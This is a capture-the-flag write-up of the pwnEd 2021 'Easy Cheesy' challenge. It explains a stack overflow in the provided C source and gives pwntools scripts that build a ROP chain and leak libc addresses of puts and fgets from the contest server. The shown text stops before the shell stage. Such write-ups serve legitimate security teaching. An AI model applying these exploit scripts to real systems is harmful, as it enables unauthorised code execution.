<h1 id="pwned-2021-easy-cheesy-writeup">pwnEd 2021 “Easy Cheesy” Writeup</h1>

<p>Hey everyone. Today I’ll be taking you through how I solved the “Easy Cheesy” challenge during the 2021 pwnEd CTF. This was a really, really fun challenge for me, and I’m really happy I was able to do it.</p>

<h2 id="step-1-reading-the-source">Step 1: Reading the source</h2>

<p>pwnEd were kind enough to give us the source for this challenge, which can be a big help, especially with some of the more difficult challenges. Here’s the file:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#include &lt;stdio.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="n">void</span> <span class="n">alarm_handler</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Too slow.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>

<span class="n">void</span> <span class="n">setup</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">signal</span><span class="p">(</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">alarm_handler</span><span class="p">);</span>
    <span class="n">alarm</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
<span class="p">}</span>

<span class="nb">int</span> <span class="n">main</span><span class="p">(</span><span class="nb">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">setup</span><span class="p">();</span>
    <span class="n">char</span> <span class="nb">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"ROP me baby!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fgets</span><span class="p">(</span><span class="nb">buffer</span><span class="p">,</span> <span class="mi">2048</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can see straight away that the vulnerability is in main(), where fgets() attempts to read 2048 bytes into a 64 byte buffer. So, we can write outside of our allocated stack space, which should let us control RIP, the Instruction Pointer.</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled.png" /></p>

<p>We can see that running the program just prompts us for an input, then takes it and returns 0, exiting the program.</p>

<h2 id="step-2-reading-the-assembly">Step 2: Reading the assembly</h2>

<p>Once reading the source, we’ll take a peek at the assembly, just to see what’s going on in there, too. We’ll quickly run checksec on the binary too, so we can see what kind of protections we’re up against.</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%201.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%201.png" /></p>

<p>Full RELRO means that the GOT is unable to be written to, and NX means that our stack will be non executable. This means that unfortunately, we can’t just write our exploit to the stack, then jump to it and execute it.</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%202.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%202.png" /></p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%203.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%203.png" /></p>

<p>Okay, it’s as we expected. It enters the function, allocates some space to the stack, prints out the “ROP me baby!” message, takes out input, and then exits again. Armed with all of this info, we can begin crafting our exploit…</p>

<h2 id="step-4-figuring-out-our-initial-payload-length">Step 4: Figuring out our initial payload length</h2>

<p>Now that we know what the binary is doing, we can begin to craft a really simple, proof-of-concept payload. We’re going to do the following things:</p>

<ol>
  <li>Overflow the buffer by 16 bytes in order to see if we segfault</li>
  <li>Create a payload that will simply overwrite RIP with a new value</li>
  <li>Send the payload and see if we change the program flow</li>
</ol>

<p>We’re overflowing by 16 bytes initially because of the way the stack is structured at this point in time. After overflowing the buffer, the very next thing on the stack is the previous stack pointer, which we’re going to overwrite. And then, immediately after this, there’s our 8 byte <strong>return address</strong>, which is what we want to control in order to change the program flow. Let’s see if we changed the address of RIP:</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%204.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%204.png" /></p>

<p>Okay, it segfaults at 80 A’s….</p>

<p>It looks like we did change RIP, because the program segfaults.</p>

<p>So now I’ll whip up a small proof of concept using pwntools. This will send a payload of 72 bytes, followed by the address of main(). This should make the program jump back to the main function instead of exiting normally.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">cheese</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"35.246.53.125"</span><span class="p">,</span> <span class="mi">10005</span><span class="p">)</span> <span class="c1">#The location of the binary to be run
</span><span class="n">context</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easy_cheesy"</span><span class="p">)</span> <span class="c1">#Our local binary, where we'll grab symbols from
</span>
<span class="c1">#We can get addresses out of binaries really easily using pwntools "symbols".symbols["main] will give us the entrypoint for main
</span><span class="n">main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span> <span class="c1">#p64 will pack the address of main into a 64bit address
</span><span class="n">junk</span> <span class="o">=</span> <span class="p">((</span><span class="s">"A"</span><span class="p">)</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#Encode our payload so we can concatenate it with the bytes-format of packed addresses
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">main</span>

<span class="n">cheese</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">cheese</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%205.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%205.png" /></p>

<p>Running the POC</p>

<p>Annnnd it works! We know it worked, because the prompt from main gets sent to us twice! This means that main() ran once, had it’s RIP overwritten to point back to itself, and then ran again because of that. Now we’re onto the next step.</p>

<h2 id="step-5-leaking-an-address">Step 5: Leaking an address</h2>

<p>Now that we can jump around in memory, we need to look at the bigger picture. Our end goal is to call system(“/bin/sh”), or execve(“/bin/sh”). This will get us a shell on the server, allowing us to read the flag.</p>

<p>But, system() and execve() aren’t in the binary, so we’ll have to grab them from elsewhere. Fortunately, we can perform a ret2libc attack in order to call them.</p>

<p>In order to call function from libc, we need to find out where they are in memory. Because ASLR is enabled on the server, the address of libc will change each time the binary is executed, but the function offsets inside libc will not. So each time we run our exploit, we need to leak some functions in order to find out where libc is .</p>

<p>To do this, we’ll follow my super cool 5 step plan:</p>

<ol>
  <li>Control the RDI register in order to control arg1 of a function</li>
  <li>Place the GOT address of puts() (it’s real address in memory) into RDI</li>
  <li>Call puts from the PLT, who’s arg1 is now the puts() address in the GOT</li>
  <li>Jump back to main so we don’t segfault out and die</li>
</ol>

<p>If you don’t know what the PLT and GOT are, you can read all about them <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html"><strong>here</strong></a>. But a quick overview for now is that the PLT(Procedure Linkage Table) is where the program looks when it wants to call a function, and the GOT (Global Offset Table) is where the actual address for that function is in memory.</p>

<p>Knowing this, we can make a payload like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">cheese</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"35.246.53.125"</span><span class="p">,</span> <span class="mi">10005</span><span class="p">)</span> <span class="c1">#The location of the binary to be run
</span><span class="n">context</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easy_cheesy"</span><span class="p">)</span> <span class="c1">#Our local binary, where we'll grab symbols from
</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401303</span><span class="p">)</span> <span class="c1">#An RDI gadget in the binary. I found this using "ropper -f easy_cheesy"
</span><span class="n">putsGOT</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="c1">#The real address of puts() in memory                                                            │
</span><span class="n">putsPLT</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="c1">#The PLT address of puts(). Jumping here will call puts() for us.
</span><span class="n">junk</span> <span class="o">=</span> <span class="p">((</span><span class="s">"A"</span><span class="p">)</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#Encode our payload so we can concatenate it with the bytes-format of packed addresses
</span>
<span class="n">stage_1</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">putsGOT</span> <span class="o">+</span> <span class="n">putsPLT</span> <span class="o">+</span> <span class="n">main</span>
<span class="n">cheese</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stage_1</span><span class="p">)</span> <span class="c1">#Send it
</span><span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="c1">#Grab the output from puts(), chop off the nullbyte
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">f'Leaked puts: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span> <span class="c1">#We now have a useable address
</span>
<span class="n">cheese</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%206.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%206.png" /></p>

<p>Now we’ve leaked the real address of puts in libc, we can see that the address is 5a0. Puts will always be at this offset in libc (in this version of libc), however the base of libc will change. So we can use this offset to take a guess at what libc version we might need, in order to find the more useful functions</p>

<p>I used <a href="http://libc.rip">libc.rip</a> to put the offset in and see what it came back with.</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%207.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%207.png" /></p>

<p>That’s a lot of possible libc versions, so we can try and narrow it down further. We can use the same technique, except this time, we’ll leak the address of fgets(), which has also been included in this binary.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">cheese</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"35.246.53.125"</span><span class="p">,</span> <span class="mi">10005</span><span class="p">)</span> <span class="c1">#The location of the binary to be run
</span><span class="n">context</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easy_cheesy"</span><span class="p">)</span> <span class="c1">#Our local binary, where we'll grab symbols from
</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"main"</span><span class="p">])</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401303</span><span class="p">)</span> <span class="c1">#An RDI gadget in the binary
</span><span class="n">putsGOT</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="c1">#The real address of puts() in memory                                                            │
</span><span class="n">putsPLT</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">])</span> <span class="c1">#The PLT address of puts(). Jumping here will call puts() for us.
</span><span class="n">fgetsGOT</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">context</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"fgets"</span><span class="p">])</span>
<span class="n">junk</span> <span class="o">=</span> <span class="p">((</span><span class="s">"A"</span><span class="p">)</span><span class="o">*</span><span class="mi">72</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span> <span class="c1">#Encode our payload so we can concatenate it with the bytes-format of packed addresses
</span>
<span class="n">stage_1</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">putsGOT</span> <span class="o">+</span> <span class="n">putsPLT</span> <span class="o">+</span> <span class="n">main</span>
<span class="n">cheese</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stage_1</span><span class="p">)</span> <span class="c1">#Send it
</span><span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="c1">#Grab the output from puts(), chop off the nullbyte
</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">f'Leaked puts: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span> <span class="c1">#We now have a useable address
</span>
<span class="n">stage_2</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">pop_rdi</span> <span class="o">+</span> <span class="n">fgetsGOT</span> <span class="o">+</span> <span class="n">putsPLT</span> <span class="o">+</span> <span class="n">main</span> <span class="c1">#Same idea, but with fgetsGOT address instead of puts()
</span><span class="n">cheese</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stage_2</span><span class="p">)</span>
<span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">leaked_fgets</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">cheese</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">b'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">f'Leaked fgets: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_fgets</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">cheese</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1">#So our connection doesn't die
</span></code></pre></div></div>

<p>This time, we’ve leaked puts() and fgets() using the same method</p>

<p><img src="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%208.png" alt="pwnEd2021%20EasyCheesy%20Writeup%205c361f9a033b4a09a3ba81152d93cb4d/Untitled%208.png" /></p>

<p>Leaking fgets() real address, which is at offset 7b0</p>
